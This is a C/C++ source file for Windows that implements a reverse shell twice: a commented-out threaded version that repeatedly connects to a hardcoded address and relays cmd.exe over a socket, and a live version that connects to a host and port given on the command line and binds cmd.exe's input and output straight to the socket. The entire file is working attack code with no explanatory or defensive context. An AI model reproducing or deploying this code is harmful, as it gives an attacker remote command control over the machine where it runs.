//#include <iostream>
//#include <WinSock2.h>
//#include <process.h>
//#pragma comment(lib, "ws2_32.lib")
//#define ip "192.168.28.1"
//#define port 1234
//HANDLE g_hChildStd_IN_Rd = NULL;
//HANDLE g_hChildStd_IN_Wr = NULL;
//HANDLE g_hChildStd_OUT_Rd = NULL;
//HANDLE g_hChildStd_OUT_Wr = NULL;
//HANDLE hThread;
//HANDLE hThrecv;
//HANDLE hThsend;
//using namespace std;
//
//unsigned __stdcall recvThread(void* pArgument)
//{
//	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
//	DWORD recv_size = 0;
//	char buf[4096];
//	ZeroMemory(buf, sizeof(buf));
//	while (recv_size = recv(*x, buf, 4096, 0) != SOCKET_ERROR)
//	{
//		WriteFile(g_hChildStd_IN_Wr, buf, recv_size, NULL, NULL);
//		ZeroMemory(buf, sizeof(buf));
//	}
//	return 1;
//}
//unsigned __stdcall sendThread(void* pArgument)
//{
//	SOCKET* x = reinterpret_cast<SOCKET*> (pArgument);
//	DWORD dwRead = 0;
//	char buf[4096];
//	ZeroMemory(buf, sizeof(buf));
//	while (1)
//	{
//		if (!ReadFile(g_hChildStd_OUT_Rd, buf, 4096, &dwRead, 0) || dwRead == 0)
//			continue;
//		cout << buf << endl;
//		int a = send(*x, buf, dwRead+1, 0);
//		int b = 2;
//	}
//	return 1;
//}
//int main()
//{
//	while (1)
//	{
//		Sleep(1000);
//		SOCKET s;
//		WSADATA wsa;
//		sockaddr_in addr;
//		if (WSAStartup(MAKEWORD(2, 2), &wsa))
//		{
//			continue;
//		}
//		if ((s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL)) == INVALID_SOCKET)
//		{
//			WSACleanup();
//			continue;
//		}
//		addr.sin_family = AF_INET;
//		addr.sin_port = htons(port);
//		addr.sin_addr.s_addr = inet_addr(ip);
//		if (WSAConnect(s, (struct sockaddr*) & addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
//		{
//			closesocket(s);
//			WSACleanup();
//			continue;
//		}
//		SECURITY_ATTRIBUTES sa;
//		sa.nLength = sizeof(sa);
//		sa.bInheritHandle = true;
//		sa.lpSecurityDescriptor = NULL;
//		if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &sa, 0))
//			return 1;
//		if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
//			return 1;
//		//
//		if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0))
//			return 1;
//		if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
//			return 1;
//		PROCESS_INFORMATION pi;
//		ZeroMemory(&pi, sizeof(pi));
//		STARTUPINFO si;
//		ZeroMemory(&si, sizeof(si));
//		si.cb = sizeof(si);
//		si.hStdError = g_hChildStd_OUT_Wr;
//		si.hStdOutput = g_hChildStd_OUT_Wr;
//		si.hStdInput = g_hChildStd_IN_Rd;
//		si.dwFlags = STARTF_USESTDHANDLES;
//		if (!CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, true, 0, NULL, NULL, &si, &pi))
//		{
//			cout << GetLastError() << endl;
//			continue;
//		}
//		SOCKET s1 = s;
//		SOCKET s2 = s;
//		hThsend = (HANDLE)_beginthreadex(NULL, 0, &sendThread, &s1, 0, NULL);
//		hThrecv = (HANDLE)_beginthreadex(NULL, 0, &recvThread, &s2, 0, NULL);
//		
//		WaitForSingleObject(pi.hProcess, INFINITE);
//		CloseHandle(pi.hProcess);
//		CloseHandle(pi.hThread);
//		CloseHandle(g_hChildStd_OUT_Wr);
//		CloseHandle(g_hChildStd_IN_Rd);
//		
//		
//	}
//	return 0;
//}
#include <winsock2.h>
#include <stdio.h>
//#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;


int main(int argc, char* argv[])
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    if (argc != 3) { fprintf(stderr, "Uso: <rhost> <rport>\n"); exit(1); }
    struct hostent* host;
    host = gethostbyname(argv[1]);
    strcpy(ip_addr, inet_ntoa(*((struct in_addr*)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(argv[2]));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
    LPWSTR cmtArg = const_cast<LPWSTR>(TEXT("C:\\Windows\\System32\\cmd.exe"));
    CreateProcess(NULL, cmtArg, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    WaitForSingleObject(processo_info.hProcess,INFINITE);
    return 0;
}